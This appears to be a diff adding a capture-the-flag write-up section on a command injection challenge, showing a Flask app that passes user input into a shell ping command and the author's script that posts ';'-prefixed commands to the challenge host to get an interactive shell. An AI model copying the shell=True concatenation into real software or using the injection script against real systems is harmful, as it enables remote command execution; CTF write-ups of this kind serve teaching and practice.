@@ -238,3 +238,68 @@ Doing that I got the flag
 ```
 Flag: utflag{SSRF_isnt_so_bad_after_all}
 ```
+
+#### Command Injection 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a1c84911-23d5-4c50-b8fe-608e8a0f0a3a)
+
+The source code is given
+
+After downloading it reading the content gives this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca9346df-ba7f-470d-a026-2f2eb8142d3b)
+
+```python
+from flask import *
+import subprocess
+app = Flask(__name__)
+
+@app.route('/', methods=['POST','GET'])
+def index():
+    if request.method == 'POST':
+        url = request.form.get('url')
+        if not url is None:
+            command = 'ping -c 1 '+url
+            p = subprocess.run(command, shell=True, capture_output=True)
+            content = p.stdout.decode('ascii')
+            return render_template('index.html', content=content)
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+```
+
+We can see that if the request made is a `GET` request it returns the content of `index.html` else if the http request method is `POST` it gets the content of the url from the request form and does a ping command on the url sent 
+
+Since the comman is passed through subprocess and shell is set to True we can get command injection 🙂
+
+Here's my script for it
+
+```python
+#!/usr/bin/python3
+import requests
+import re
+
+while True:
+    try:
+        command = input('$ ')
+        if command.lower() != 'q':
+            url = 'http://forever.isss.io:4223'
+            req = requests.post(url, data={"url":f";{command}"})
+            
+            # Extract value within <code> tags using regular expression >3
+            pattern = r"<code>(.*?)</code>"
+            match = re.search(pattern, req.text, re.DOTALL)
+            
+            if match:
+                code_value = match.group(1)
+                print(code_value)
+            else:
+                print("No value found within <code> tags.")
+        
+        else:
+            exit()
+    except Exception as e:
+        print(e)
+```
+
+Running it works
+
